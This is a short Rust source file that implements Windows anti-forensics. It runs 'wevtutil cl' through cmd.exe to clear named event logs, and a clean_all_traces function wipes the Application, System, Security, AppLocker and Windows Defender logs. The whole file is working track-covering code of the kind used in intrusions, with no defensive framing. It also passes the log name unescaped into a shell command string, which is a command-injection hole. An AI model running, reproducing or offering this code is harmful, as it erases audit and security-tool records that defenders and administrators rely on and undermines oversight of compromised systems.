use std::process::Command;

#[derive(Debug)]
pub struct EventLogCleaning;

impl EventLogCleaning {
    pub fn clear_event_log(log_name: &str) -> Result<bool, String> {
        let cmd = format!("wevtutil.exe cl \"{}\"", log_name);
        let output = Command::new("cmd")
            .args(&["/C", &cmd])
            .output()
            .map_err(|e| format!("Command failed: {}", e))?;

        Ok(output.status.success())
    }

    pub fn clean_all_traces() -> Result<usize, String> {
        let logs = vec![
            "Application",
            "System",
            "Security",
            "Microsoft-Windows-AppLocker/EXE and DLL",
            "Microsoft-Windows-AppLocker/MSI and Script",
            "Microsoft-Windows-Windows Defender/Operational",
        ];

        let mut cleared = 0;

        for log in logs {
            if Self::clear_event_log(log).unwrap_or(false) {
                cleared += 1;
            }
        }

        Ok(cleared)
    }
}
